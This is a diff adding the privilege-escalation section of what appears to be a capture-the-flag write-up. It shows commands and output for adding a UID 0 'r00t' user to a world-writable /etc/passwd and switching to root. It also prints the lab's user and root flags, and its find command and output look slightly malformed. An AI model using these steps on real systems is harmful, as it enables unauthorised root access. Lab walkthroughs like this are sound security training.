@@ -363,6 +363,77 @@ it will upload successfully
 
 and we now have a shell where we can get user flag
 
+```shell
+pwd
+/home/chris
+cat user.txt
+d0006b97a14722fab09ac9a8073ec3ce
 ```
 
+We used the following command to find world-writable files, excluding `/proc`:
+
+`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null /proc /etc/passwd`
+```
+/proc
+/etc/passwd/proc
+/etc/passwd
+/sys/kernel/security/apparmor/policy/.remove
+/sys/kernel/security/apparmor/policy/.replace
+/sys/kernel/security/apparmor/policy/.load
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.ns_name
+/sys/kernel/security/apparmor/.ns_level
+/sys/kernel/security/apparmor/.ns_stacked
+/sys/kernel/security/apparmor/.stacked
+/sys/kernel/security/apparmor/.access
+```
+This file stores user account information — and if writable, allows us to add a new user with UID 0 (root).
+
+Before continuing, we upgraded our shell for better TTY support (needed for `su` to work properly):
+```
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+```
+
+
+We used OpenSSL to generate a hash for a password we controlled (`gotem` in this case):
+```
+openssl passwd -1 gotem
+$1$dgtrcdar$x11t1HhoCCdNHkV1ZFLcA/
+```
+Note: you'll get a different hash if you use a different password or salt.
+
+Then confirm TTY:
+```
+tty
+/dev/pts/0
+```
+
+
+Now we added a new user `r00t` with UID 0 (root) using our generated hash:
+```
+echo 'r00t:$1$dgtrcdar$x11t1HhoCCdNHkV1ZFLcA/:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+Then confirm it was added:
+```
+grep r00t /etc/passwd
+r00t:$1$dgtrcdar$x11t1HhoCCdNHkV1ZFLcA/:0:0:root:/root:/bin/bash
+```
+
+Now we switched to the `r00t` user:
+```
+su r00t
+password: gotem
+```
+We successfully gained a root shell by injecting a malicious user into `/etc/passwd`.
+```
+whoami
+root
+```
+
+Now lets grab the flag and move on!
+```
+cat root/root.txt
+f3d14fff8152570e006e25a410bd9a58
 ```
